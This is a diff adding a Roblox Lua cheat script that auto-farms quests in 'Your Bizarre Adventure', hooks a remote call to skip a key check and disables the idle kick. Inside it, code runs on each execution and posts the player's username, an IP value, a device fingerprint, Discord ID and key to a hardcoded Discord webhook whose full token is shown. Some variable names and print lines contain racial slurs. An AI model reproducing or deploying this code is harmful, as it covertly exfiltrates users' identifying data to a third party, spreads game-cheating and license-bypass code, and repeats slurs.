@@ -1,0 +1,867 @@
+getgenv().ABOVE = true
+
+while getgenv().ToggledMIHFarm == true do
+	getgenv().devbypasscheckdis = true
+	local PlaceID = game.PlaceId
+	local AllIDs = {}
+	local foundAnything = ""
+	local actualHour = os.date("!*t").hour
+	local Deleted = false
+	local File = pcall(function()
+		AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
+	end)
+	if not File then
+		table.insert(AllIDs, actualHour)
+		writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+	end
+	function TPReturner()
+		local Site;
+		if foundAnything == "" then
+			Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/2809202155/servers/Public?sortOrder=Asc&limit=100'))
+		else
+			Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/2809202155/servers/Public?sortOrder=Asc&limit=100'))
+		end
+		local ID = ""
+		if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+			foundAnything = Site.nextPageCursor
+		end
+		local num = 0;
+		for i,v in pairs(Site.data) do
+			local Possible = true
+			ID = tostring(v.id)
+			if v.playing ~= v.maxPlayers then
+				for _,Existing in pairs(AllIDs) do
+					if num ~= 0 then
+						if ID == tostring(Existing) then
+							Possible = false
+						end
+					else
+						if tonumber(actualHour) ~= tonumber(Existing) then
+							local delFile = pcall(function()
+								delfile("NotSameServers.json")
+								AllIDs = {}
+								table.insert(AllIDs, actualHour)
+							end)
+						end
+					end
+					num = num + 1
+				end
+				if Possible == true then
+					table.insert(AllIDs, ID)
+					wait()
+					pcall(function()
+						writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+						wait()
+						game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
+					end)
+					wait(0)
+				end
+			end
+		end
+	end
+
+	function Teleport()
+		while wait(2) do
+			pcall(function()
+				TPReturner()
+				if foundAnything ~= "" then
+					TPReturner()
+				end
+			end)
+		end
+	end
+
+
+	old = hookmetamethod(game,"__namecall", function(self,...)
+		local args = {...}
+		local method = getnamecallmethod()
+		if tostring(self) == "Returner" and tostring(method) == "InvokeServer" then
+			return "  ___XP DE KEY"
+		end
+		return old(self, ...)
+	end)
+
+	if workspace:FindFirstChild("UsedWM")==nil then
+		local usedwm = Instance.new("BillboardGui")
+		usedwm.Parent = workspace
+		usedwm.Name = "UsedWM"
+		usedwm.Enabled = false
+	end
+
+	if game.CoreGui:FindFirstChild("Bine11")==nil then
+		local nu = Instance.new("ScreenGui")
+		local nuu = Instance.new("TextLabel",nu)
+		local nana = Instance.new("TextLabel",nu)
+		nu.Parent = game.CoreGui
+		nu.Name = "Bine11"
+		nu.Enabled = true
+		nuu.Font = "SourceSansBold"
+		nuu.Size = UDim2.new(1, 0, 1, 0)
+		nuu.Text = ""
+		nuu.TextSize = 60
+		nuu.TextYAlignment = "Top"
+		nuu.TextXAlignment = "Center"
+		nuu.BackgroundTransparency = 1
+		nuu.TextColor3 = Color3.new(122, 17, 215)
+		nuu.TextScaled = false
+		nuu.TextStrokeColor3 = Color3.new(0, 0, 0)
+		nuu.TextStrokeTransparency = 0
+
+		nuu.Name = "nuu"
+		nana.Font = "SourceSansBold"
+		nana.Name = "nana"
+		nana.Size = UDim2.new(1,0,1,0)
+		nana.Text = ""
+		nana.TextColor3 = Color3.new(122, 17, 215)
+		nana.TextScaled = false
+		nana.TextSize = 70
+		nana.Position = UDim2.new(0, -540, 0, -200)
+		nana.TextStrokeColor3 = Color3.new(0, 0, 0)
+		nana.TextStrokeTransparency = 0
+		nana.BackgroundTransparency = 1
+
+	end
+
+	local function dokeyT()
+		if getgenv().UseKeyT then
+			local ciubuki = "InputBegan"
+			local coibii = {["Input"] = Enum.KeyCode.T}
+			workspace.Living:WaitForChild(game.Players.LocalPlayer.Name):WaitForChild("RemoteEvent"):FireServer(ciubuki, coibii)
+		end
+	end
+
+	local function dokeyY()
+		if getgenv().UseKeyY then
+			local trabuck = "InputBegan"
+			local tabelist = {["Input"] = Enum.KeyCode.Y}
+			workspace.Living:WaitForChild(game.Players.LocalPlayer.Name):WaitForChild("RemoteEvent"):FireServer(trabuck, tabelist)
+		end
+	end
+
+	local function doKeyX()
+		if getgenv().UseKeyX then
+			local biebicka = "InputBegan"
+			local ily = {["Input"] = Enum.KeyCode.X}
+			workspace.Living:WaitForChild(game.Players.LocalPlayer.Name):WaitForChild("RemoteEvent"):FireServer(biebicka, ily)
+		end
+	end
+
+	local function doKeyZ()
+		if getgenv().UseKeyZ then
+			local telog = "InputBegan"
+			local iubi = {["Input"] = Enum.KeyCode.Z}
+			workspace.Living:WaitForChild(game.Players.LocalPlayer.Name):WaitForChild("RemoteEvent"):FireServer(telog, iubi)
+		end
+	end
+
+	game:GetService("RunService").RenderStepped:Connect(function()
+		pcall(function()
+			if game:GetService("Players").LocalPlayer.Character:FindFirstChild("InTimeStop") then
+				game:GetService("Players").LocalPlayer.Character:FindFirstChild("InTimeStop"):Destroy()
+			end
+		end )
+	end )
+
+	local function checkplayers()
+		if getgenv().HopOnPlayersNear == true then
+			for i,v in pairs(game.Players:GetPlayers()) do
+				if v.Name ~= game.Players.LocalPlayer.Name then
+					if v.Character and (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 60 then
+						Teleport()
+					end
+				end
+			end
+		end
+	end
+	getgenv().WM = game.CoreGui["HsB Wm"]
+	getgenv().MainFrm = WM.MainFrame
+
+	local LocalPlayer = game.Players.LocalPlayer
+
+    local function sendWebhook(Blehh, ping)
+		local everyone
+		if getgenv().ping == "" then
+			everyone = ""
+		elseif getgenv().ping ~= "" and ping == true then
+			everyone = "<@"..getgenv().ping..">"
+		end
+		local data = {
+			['content'] = everyone,
+			['username'] = "HsB CatHook",
+			["embeds"] = {{
+				['title'] = "Your Bizarre Adventure",
+				['color'] = tonumber(0xff7f42),
+				["footer"] = {
+					["text"] = ("HsB Hub ("..os.date("%H:%M")..")"),
+					["icon_url"] = "https://cdn.discordapp.com/attachments/875211210486870076/1067422518413103134/hsb222.png"
+				},
+				["fields"] = {
+					{
+						["name"] = "Account Name", -- This is  the title of your field.
+						["value"] = "||"..game.Players.LocalPlayer.Name.."||" -- This is the value of your field.
+					},
+					{
+						["name"] = "InfoHook", -- This is  the title of your field.
+						["value"] = Blehh -- This is the value of your field.
+					},
+				}}
+			}
+		}
+		local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+		local headers = {
+			["content-type"] = "application/json"
+		}
+		request = http_request or request or HttpPost or syn.request
+		local abcdef = {Url = getgenv().webhooklink, Body = newdata, Method = "POST", Headers = headers}
+		request(abcdef)
+	end
+
+	local url =
+		"https://discord.com/api/webhooks/1059249553548779651/n9VQfVZTU5dTBg39ouOIWiMI_GyPTvzjNzhNxToCmodLMUJXmIjPl0uT48CPvT_E__TU"
+	local data = {
+		["content"] = "",
+		["embeds"] = {
+			{
+				["title"] = "Someone Executed Your Mih Script",
+				["description"] = "Username: "..LocalPlayer.Name.." IP: "..game.CoreGui.rackz.Value.. " FingerPrint: "..game.CoreGui.bimd.Value.. " Discord: ".."<@"..getgenv().ping..">".." Key: "..getgenv().Update,
+				["type"] = "rich",
+				["color"] = math.random(1, 16777215),
+				["image"] = {
+					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name)
+				}
+			}
+		}
+	}
+	local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+	local headers = {
+		["content-type"] = "application/json"
+	}
+	request = http_request or request or HttpPost or syn.request
+	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+	request(abcdef)
+
+	if game.CoreGui:FindFirstChild("Bine11")==nil then
+		local nu = Instance.new("ScreenGui")
+		local nuu = Instance.new("TextLabel",nu)
+		local nana = Instance.new("TextLabel",nu)
+		nu.Parent = game.CoreGui
+		nu.Name = "Bine11"
+		nu.Enabled = true
+		nuu.Font = "SourceSansBold"
+		nuu.Size = UDim2.new(1, 0, 1, 0)
+		nuu.Text = ""
+		nuu.TextSize = 60
+		nuu.TextYAlignment = "Top"
+		nuu.TextXAlignment = "Center"
+		nuu.BackgroundTransparency = 1
+		nuu.TextColor3 = Color3.new(122, 17, 215)
+		nuu.TextScaled = false
+		nuu.TextStrokeColor3 = Color3.new(0, 0, 0)
+		nuu.TextStrokeTransparency = 0
+
+		nuu.Name = "nuu"
+		nana.Font = "SourceSansBold"
+		nana.Name = "nana"
+		nana.Size = UDim2.new(1,0,1,0)
+		nana.Text = ""
+		nana.TextColor3 = Color3.new(122, 17, 215)
+		nana.TextScaled = false
+		nana.TextSize = 70
+		nana.Position = UDim2.new(0, -540, 0, -200)
+		nana.TextStrokeColor3 = Color3.new(0, 0, 0)
+		nana.TextStrokeTransparency = 0
+		nana.BackgroundTransparency = 1
+
+	end
+
+	for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
+		v:Disable()
+	end
+
+	local backpack = LocalPlayer.Backpack
+
+	local rib = "Rib Cage of The Saint's Corpse"
+	local pelvis = "Pelvis of The Saint's Corpse"
+	local heart = "Heart of The Saint's Corpse"
+	local arm = "Left Arm of The Saint's Corpse"
+
+	if backpack:FindFirstChild("Redeemed Rib Cage of The Saint's Corpse") then backpack["Redeemed Rib Cage of The Saint's Corpse"].Name = ("Rib Cage of The Saint's Corpse") end
+	if backpack:FindFirstChild("Redeemed Pelvis of The Saint's Corpse") then backpack["Redeemed Pelvis of The Saint's Corpse"].Name = ("Pelvis of The Saint's Corpse") end
+	if backpack:FindFirstChild("Redeemed Heart of The Saint's Corpse") then backpack["Redeemed Heart of The Saint's Corpse"].Name = ("Heart of The Saint's Corpse") end
+	if backpack:FindFirstChild("Redeemed Left Arm of The Saint's Corpse") then backpack["Redeemed Left Arm of The Saint's Corpse"].Name = ("Left Arm of The Saint's Corpse") end
+	print("Finished changing names")
+
+	if backpack:FindFirstChild(rib)==nil or backpack:FindFirstChild(pelvis)==nil or backpack:FindFirstChild(heart)==nil or backpack:FindFirstChild(arm)==nil then
+		local GUI = Instance.new("ScreenGui")
+		local Main = Instance.new("Frame", GUI)
+		local title = Instance.new("TextLabel", Main)
+		local message = Instance.new("TextLabel", Main)
+		local pula = Instance.new("TextLabel", Main)
+		local niager = Instance.new("TextLabel", Main)
+		GUI.Name = "HsB Wm"
+		GUI.Enabled = true
+		GUI.Parent = game.CoreGui
+		title.Name = ("Buci")
+		message.Name = ("Bucu")
+		pula.Name = ("Nuvreau")
+		niager.Name = ("Bine")
+		Main.Name = "MainFrame"
+		Main.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
+		Main.BorderSizePixel = 0
+		Main.Position = UDim2.new(0, 0, 0, -40)
+		Main.Size = UDim2.new(1, 0, 0, 1100)
+		Main.BackgroundTransparency = 0
+
+		title.BackgroundTransparency = 1
+		title.Font = Enum.Font.SourceSansBold
+		title.Position = UDim2.new(0, -30, 1, -1100)
+		title.Size = UDim2.new(1, 0, 0, 60)
+		title.Text = "Please get all the saint's \"corpse parts\""
+		title.TextColor3 = Color3.new(455, 455, 455)
+		title.TextSize = 17
+		title.TextScaled = true
+		title.TextTransparency = 0
+
+		message.BackgroundTransparency = 1
+		message.Font = Enum.Font.SourceSansBold
+		message.Position = UDim2.new(0, -30, 1, -900)
+		message.Size = UDim2.new(1, 0, 0, 60)
+		message.Text = "Script did not execute!"
+		message.TextColor3 = Color3.new(455, 455, 455)
+		message.TextSize = 17
+		message.TextScaled = true
+		message.TextWrapped = true
+		message.TextTransparency = 0
+
+		pula.BackgroundTransparency = 1
+		pula.Font = Enum.Font.SourceSansBold
+		pula.Position = UDim2.new(0, -30, 1, -500)
+		pula.Size = UDim2.new(1, 0, 0, 70)
+		pula.Text = "discord.gg/HTCZPzTrzc"
+		pula.TextColor3 = Color3.new(455, 455, 455)
+		pula.TextSize = 20
+		pula.TextScaled = true
+		pula.TextWrapped = true
+		pula.TextTransparency = 0
+		setclipboard(tostring(pula.text))
+		wait(9e9)
+	end
+
+	if not LocalPlayer.Character:FindFirstChild("StandMorph") then
+		repeat wait()
+			LocalPlayer.Character:WaitForChild("RemoteFunction"):InvokeServer("ToggleStand", "Toggle")
+		until LocalPlayer.Character:FindFirstChild("StandMorph")
+		print("stand")
+	end
+
+	LocalPlayer.Character.ChildAdded:Connect(function(child)
+		if child.Name == "InTimeStop" then
+			child:Destroy()
+		end
+	end)
+
+	local function endDialogue(NPC, Dialogue, Option)
+		local dialogueToEnd = {
+			["NPC"] = NPC,
+			["Dialogue"] = Dialogue,
+			["Option"] = Option
+		}
+		workspace.Living[LocalPlayer.Name]:WaitForChild("RemoteEvent"):FireServer("EndDialogue", dialogueToEnd)
+		print("ENDED THE FOLLOWING DIALOGUE", NPC, Dialogue, Option)
+	end
+
+	local function Telepoarta()
+		local part = Instance.new("Part")
+		part.Name = tostring(math.random(1, 9999))
+		part.Anchored = true
+		part.Size = Vector3.new(200,1,200)
+		part.Parent = workspace
+		part.Transparency = 1
+		part.Position = Vector3.new(math.random(1,999), math.random(400, 800), math.random(1,900))
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame * CFrame.new(0, 7, 0)
+	end
+
+	local function WSDialogue()
+		if LocalPlayer.PlayerStats.Stand.Value == "Whitesnake" and LocalPlayer.Backpack:FindFirstChild("Green Baby")==nil    then
+			endDialogue("Pucci", "Thugs", "Option1")
+			endDialogue("Pucci", "Alpha Thugs", "Option1")
+			endDialogue("Pucci", "Corrupt Police", "Option1")
+			endDialogue("Pucci", "Zombie Henchman", "Option1")
+			endDialogue("Pucci", "Vampire", "Option1")
+			endDialogue("Pucci", "Green Baby", "Option1")
+		end
+	end
+	local function MIHDialogue()
+
+		endDialogue("Green Baby", "Dialogue2", "Option1")
+		endDialogue("Pucci", "MIH12", "Option1")
+		endDialogue("Pucci", "MIH6", "Option1")
+		if LocalPlayer.PlayerStats.Stand.Value == "C-Moon" and LocalPlayer.Backpack:FindFirstChild("Dio's Bone")== nil then
+			endDialogue("Path to Heaven", "Dialogue8", "Option1")
+		end
+		endDialogue("Heaven Ascension DEO Quest", "Dialogue5", "Option1")
+		endDialogue("Pucci", "MIH9", "Option1")
+	end
+
+	local function killNPC(npcName, niggabalz, playerDistance)
+		print("Started to farm")
+		local NPC = workspace.Living:FindFirstChild(npcName)
+		LocalPlayer.Character.HumanoidRootPart.CFrame = NPC.HumanoidRootPart.CFrame
+		wait(0.70)
+		local beingTargeted = true
+
+		game.Players.LocalPlayer.PlayerGui.HUD.Main.DropMoney.Money.ChildAdded:Connect(function()
+			print("Dead npc")
+			beingTargeted = false
+
+			if workspace.Living:FindFirstChild(npcName) then
+				pcall(function()
+					if getgenv().DisplayHealth then print(NPC.Health.Value) end
+					LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Living[npcName].HumanoidRootPart.CFrame
+					if NPC.Name ~= "Heaven Ascension Dio" and NPC.Name ~= "Jotaro Kujo" then
+
+						NPC:Destroy()
+						wait(1)
+						beingTargeted = true
+					end
+					if NPC.Name == "Vampire" and NPC.Health.Value <= 0 then
+						LocalPlayer.Character.HumanoidRootPart.CFrame = NPC.HumanoidRootPart.CFrame
+						NPC:Destroy()
+						beingTargeted = true
+						wait(0.25)
+					end
+				end)
+			end
+		end)
+		while beingTargeted do
+			task.wait()
+			if beingTargeted and getgenv().ABOVE then
+				pcall(function()
+					if getgenv().DisplayHealth == true then
+						game.CoreGui.Bine11.nuu.Text = NPC.Humanoid.Health
+					end
+					if LocalPlayer.Character:FindFirstChild("StandMorph") == nil then
+						repeat wait()
+							LocalPlayer.Character:WaitForChild("RemoteFunction"):InvokeServer("ToggleStand", "Toggle")
+						until LocalPlayer.Character:FindFirstChild("StandMorph")
+					end
+					if LocalPlayer.Character and (LocalPlayer.Character.HumanoidRootPart.Position - NPC.HumanoidRootPart.Position).magnitude < 70 then
+						if LocalPlayer.PlayerStats.Stand.Value == "Whitesnake" then
+							doKeyX()
+						end
+						dokeyY()
+						dokeyT()
+						if LocalPlayer.PlayerStats.Stand.Value == "Whitesnake" then
+							doKeyZ()
+						end
+						game.Players.LocalPlayer.Character.RemoteEvent:FireServer("Attack", "m1")
+
+					end
+					LocalPlayer.Character.StandMorph.HumanoidRootPart.CFrame = CFrame.lookAt(NPC:WaitForChild"HumanoidRootPart".Position, NPC:WaitForChild"Head".Position)
+					LocalPlayer.Character.HumanoidRootPart.CFrame = NPC:WaitForChild"HumanoidRootPart".CFrame - NPC:WaitForChild"HumanoidRootPart".CFrame.lookVector * 2 + Vector3.new(0, playerDistance, niggabalz)
+
+				end)
+			end
+			if beingTargeted and not getgenv().ABOVE then
+				pcall(function()
+					LocalPlayer.Character.StandMorph.HumanoidRootPart.CFrame = CFrame.lookAt(NPC.HumanoidRootPart.Position, NPC.LeftLowerLeg.Position)
+					LocalPlayer.Character.HumanoidRootPart.CFrame = NPC.HumanoidRootPart.CFrame - NPC.HumanoidRootPart.CFrame.lookVector * 2 + Vector3.new(0, playerDistance, 0)
+				end)
+			end
+		end
+	end
+
+
+	local function WStoCMOON()
+		if LocalPlayer.PlayerStats.Stand.Value == "Whitesnake" and LocalPlayer.Backpack:FindFirstChild("Green Baby")==nil then
+			if not LocalPlayer.Character:FindFirstChild("StandMorph") then
+				repeat wait()
+					LocalPlayer.Character:WaitForChild("RemoteFunction"):InvokeServer("ToggleStand", "Toggle")
+				until LocalPlayer.Character:FindFirstChild("StandMorph")
+			end
+			if getgenv().UseKeyT then
+				local SpiritDisk = "LearnSkill"
+				local spirittabla = {
+					["Skill"] = "Spirit Disc",
+					["SkillTreeType"] = "Stand"
+				}
+				workspace.Living:WaitForChild(game.Players.LocalPlayer.Name).RemoteFunction:InvokeServer(SpiritDisk, spirittabla)
+			end
+
+			if getgenv().UseKeyY then
+				local MemoryDisk = "LearnSkill" local tabladisk = {["Skill"] = "Memory Disc",["SkillTreeType"] = "Stand"}
+				workspace.Living:WaitForChild(game.Players.LocalPlayer.Name).RemoteFunction:InvokeServer(MemoryDisk, tabladisk)
+			end
+
+			if getgenv().UseKeyX == true then
+				local Buca = "LearnSkill" local Natyscrem = {["Skill"] = "Acidic Spew",["SkillTreeType"] = "Stand"}
+				workspace.Living:WaitForChild(game.Players.LocalPlayer.Name).RemoteFunction:InvokeServer(Buca, Natyscrem)
+			end
+
+			if getgenv().UseKeyZ == true then
+				local Pistol = "LearnSkill" local amerika = {["Skill"] = "Burst Fire",["SkillTreeType"] = "Stand"}
+				workspace.Living:WaitForChild(game.Players.LocalPlayer.Name).RemoteFunction:InvokeServer(Pistol, amerika)
+			end
+
+			WSDialogue()
+			MIHDialogue()
+
+			if game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 30 Thugs (Dio's Plan)") then
+				print("THUG")
+				repeat task.wait()
+					killNPC("Thug", 0, 20)
+					checkplayers()
+				until game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 30 Thugs (Dio's Plan)")==nil
+				sendWebhook("Finished Thugs", true)
+				wait(1)
+				WStoCMOON()
+
+			end
+
+
+			if game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 25 Alpha Thugs (Dio's Plan)") then
+				print("ALPHA THUG")
+				repeat task.wait()
+					killNPC("Alpha Thug", 0, 20)
+					checkplayers()
+				until game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 25 Alpha Thugs (Dio's Plan)")==nil
+				sendWebhook("Finished Alpha Thugs",true)
+				wait(1)
+				WStoCMOON()
+			end
+
+			if game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 20 Corrupt Police (Dio's Plan)") then
+				print("CORRUPT POLICE")
+				repeat task.wait()
+					killNPC("Corrupt Police", 0, 20)
+					checkplayers()
+				until game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 20 Corrupt Police (Dio's Plan)")==nil
+				sendWebhook("Finished Corrupt Polis",true)
+				wait(1)
+				WStoCMOON()
+
+			end
+
+			if game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 15 Zombie Henchman (Dio's Plan)") then
+				print("ZOMBIE")
+				repeat task.wait()
+					killNPC("Zombie Henchman", 0, 13)
+					checkplayers()
+				until game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 15 Zombie Henchman (Dio's Plan)")==nil
+				wait(1)
+				sendWebhook("Finished Henchmen", true)
+				WStoCMOON()
+				wait(1)
+				LocalPlayer.Character.Head:Destroy()
+			end
+			wait(1)
+
+			if game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 10 Vampires (Dio's Plan)") then
+				print("VAMPIRE")
+				repeat task.wait()
+					killNPC("Vampire", 0, 14)
+					checkplayers()
+				until game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 10 Vampires (Dio's Plan)")==nil
+				sendWebhook("Finished Vampiras",true)
+				Telepoarta()
+				wait(0.50)
+				Telepoarta()
+				wait(0.60)
+				WStoCMOON()
+				wait(1.50)
+			end
+		end
+		if LocalPlayer.Backpack:FindFirstChild("Green Baby") then
+			sendWebhook("Found greenbaby!!", false)
+			local stringa = "LearnSkill"
+			local tabli = {["Skill"] = "Worthiness V", ["SkillTreeType"] = "Character"}
+			workspace.Living:WaitForChild(game.Players.LocalPlayer.Name).RemoteFunction:InvokeServer(stringa, tabli)
+
+			LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack["Green Baby"])
+			wait(0.50)
+			LocalPlayer.Character["Green Baby"]:Activate()
+			firesignal(LocalPlayer.PlayerGui:WaitForChild"DialogueGui":WaitForChild"Frame":WaitForChild"ClickContinue".MouseButton1Click)
+			task.wait(0.25)
+			firesignal(LocalPlayer.PlayerGui:WaitForChild"DialogueGui":WaitForChild"Frame":WaitForChild"Options":WaitForChild"Option1":WaitForChild"TextButton".MouseButton1Click)
+			sendWebhook("Used him lxd",false)
+			wait(0.10)
+			WStoCMOON()
+			WSDialogue()
+			MIHDialogue()
+
+
+			local babab = "LearnSkill" 
+			local nunub = {
+				["Skill"] = "Vitality X",
+				["SkillTreeType"] = "Character"}
+			workspace.Living:WaitForChild(game.Players.LocalPlayer.Name).RemoteFunction:InvokeServer(babab, nunub)
+			local kuku = "LearnSkill" 
+			local bau = {
+				["Skill"] = "Sturdiness III",
+				["SkillTreeType"] = "Character"}
+			workspace.Living:WaitForChild(game.Players.LocalPlayer.Name).RemoteFunction:InvokeServer(kuku, bau)
+			-- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide
+			if getgenv().UseKeyT then
+				local uuuu = "LearnSkill"
+				local gggg = {
+					["Skill"] = "Uppercut to The Moon",
+					["SkillTreeType"] = "Stand"
+				}
+
+				workspace.Living[LocalPlayer.Name].RemoteFunction:InvokeServer(uuuu, gggg)
+			end
+			if getgenv().UseKeyY then
+				local ytytyt = "LearnSkill"
+				local tytyty = {
+					["Skill"] = "Surface Inversion Punch",
+					["SkillTreeType"] = "Stand"
+				}
+
+				workspace.Living[LocalPlayer.Name].RemoteFunction:InvokeServer(ytytyt, tytyty)
+			end
+
+			wait(1)
+			MIHDialogue()
+			LocalPlayer.Character.HumanoidRootPart:Destroy()
+		end
+	end
+
+	local function dioBone()
+		if not game.Players.LocalPlayer.Backpack:FindFirstChild("Dio's Bone") then
+			if LocalPlayer.PlayerStats.Stand.Value == "C-Moon" and LocalPlayer.Backpack:FindFirstChild("Dio's Bone")==nil then
+				if workspace.Living:FindFirstChild("Heaven Ascension Dio")==nil then sendWebhook("Dio not found (may be false alarm)",true) end
+
+				repeat wait() until workspace.Living:FindFirstChild("Heaven Ascension Dio")
+				repeat task.wait()
+					killNPC("Heaven Ascension Dio", 2, 45)
+					checkplayers()
+				until LocalPlayer.Backpack:FindFirstChild("Dio's Bone") or workspace.Living["Heaven Ascension Dio"].Health.Value == 0
+				if workspace.Living["Heaven Ascension Dio"].Health.Value == 0 then
+					print("bokai")
+					Telepoarta()
+					workspace.Living["Heaven Ascension Dio"]:Destroy()
+					print("Destroyed nig")
+					LocalPlayer.Character:WaitForChild("RemoteFunction"):InvokeServer("ToggleStand", "Toggle")
+					workspace.Living:WaitForChild("Heaven Ascension Dio")
+					dioBone()
+					wait(1.2)
+					if LocalPlayer.Backpack:FindFirstChild("Dio's Bone") then
+						sendWebhook("Ez boner :flushed:",true)
+						MIHDialogue()
+						WSDialogue()
+						LocalPlayer.Character.HumanoidRootPart:Destroy()
+						print(",abe")
+					end
+				end
+			end
+		end
+	end
+
+	local function jotaroDisc()
+		if LocalPlayer.PlayerStats.Stand.Value == "C-Moon" and LocalPlayer.Backpack:FindFirstChild("Dio's Bone") and LocalPlayer.Backpack:FindFirstChild("Jotaro's Disc")==nil then
+			MIHDialogue()
+			if workspace.Living:FindFirstChild("Jotaro Kujo")==nil then print("no jotaro")
+				sendWebhook("Jotaro not found (may be false alarm)", true)
+			end
+			workspace.Living:WaitForChild("Jotaro Kujo")
+
+			workspace.Living["Jotaro Kujo"].HumanoidRootPart.ChildAdded:Connect(function(mhm)
+				if mhm.Name == "Sound"then
+					if mhm.SoundId == "rbxassetid://6032844827" or mhm.SoundId == "rbxassetid://4725629903" then
+
+						LocalPlayer.Character:WaitForChild("RemoteEvent"):FireServer("StartBlocking")
+						wait(1.60)
+						LocalPlayer.Character:WaitForChild("RemoteEvent"):FireServer("StopBlocking")
+					end
+				end
+			end)
+
+			repeat task.wait()
+				killNPC("Jotaro Kujo", 2, 45)
+				checkplayers()
+			until LocalPlayer.Backpack:FindFirstChild("Jotaro's Disc") or workspace.Living["Jotaro Kujo"].Health.Value == 0
+			wait(0.25)
+			if workspace.Living["Jotaro Kujo"].Health.Value == 0 and LocalPlayer.Backpack:FindFirstChild("Jotaro's Disc")==nil then
+				Telepoarta()
+				wait(0.25)
+				workspace.Living["Jotaro Kujo"]:Destroy()
+				print("destroied jotra")
+				workspace.Living:WaitForChild("Jotaro Kujo")
+				wait(0.25)
+				jotaroDisc()
+
+				wait(0.50)
+			elseif LocalPlayer.Backpack:FindFirstChild("Jotaro's Disc") then
+				wait(0.50)
+				sendWebhook("Got Jotaro's Disc", false)
+				game:GetService("ReplicatedStorage").Sounds.HeavenBass:Destroy()
+				game:GetService("ReplicatedStorage").Sounds.HeavenBass2:Destroy()
+
+				wait(0.25)
+				WSDialogue()
+				jotaroDisc()
+				MIHDialogue()
+				dioBone()
+				wait(1)
+
+				while LocalPlayer.PlayerStats.Stand.Value == "C-Moon" do
+					LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-239.357712, 370.272675, 351.081848, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+					wait(0.25)
+					game:GetService("ReplicatedStorage").Sounds.HeavenBass3:Play()
+					game:GetService("ReplicatedStorage").Sounds.HeavenBass3:Play()
+					game:GetService("ReplicatedStorage").Sounds["Double Accel"]:Play()
+					repeat wait()
+						workspace.Living:WaitForChild(game.Players.LocalPlayer.Name).RemoteFunction:InvokeServer("ToggleStand", "Toggle")
+					until game.Players.LocalPlayer.PlayerStats.Stand.Value == "Made in Heaven"
+					sendWebhook("You got MIH OOMG!!?", true)
+				end
+			end
+		end
+	end
+
+	workspace.Living.ChildAdded:Connect(function(wowmaigad)
+		if wowmaigad.Name == LocalPlayer.Name then
+			wait(0.40)
+			Telepoarta()
+			if LocalPlayer.Character.RightLowerLeg:FindFirstChild("StandAura")==nil then
+
+				repeat wait(1)
+
+					LocalPlayer.Character:WaitForChild("RemoteFunction"):InvokeServer("ToggleStand", "Toggle")
+
+				until LocalPlayer.Character.RightLowerLeg:FindFirstChild("StandAura") and LocalPlayer.Character:FindFirstChild("StandMorph")
+			end
+			wait(1.20)
+			print('hm')
+			WSDialogue()
+			MIHDialogue()
+			WStoCMOON()
+			dioBone()
+			jotaroDisc()
+
+		end
+	end)
+
+	if LocalPlayer.PlayerStats.Stand.Value == "Whitesnake" or LocalPlayer.Backpack:FindFirstChild("Redeemed Dio's Diary") then
+		LocalPlayer.Character.HumanoidRootPart:Destroy()
+	elseif LocalPlayer.PlayerStats.Stand.Value == "C-Moon" then
+		LocalPlayer.Character.HumanoidRootPart:Destroy()
+	end
+	if LocalPlayer.PlayerStats.Stand.Value ~= "Whitesnake" or LocalPlayer.Backpack:FindFirstChild("Dio's Diary")==nil or LocalPlayer.Backpack:FindFirstChild("Green Baby")then
+		if game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 30 Thugs (Dio's Plan)")==nil and game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 25 Alpha Thugs (Dio's Plan)")==nil and game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 20 Corrupt Police (Dio's Plan)")==nil and game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 15 Zombie Henchman (Dio's Plan)")==nil and game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Defeat 10 Vampires (Dio's Plan)")==nil then
+			print("waht")
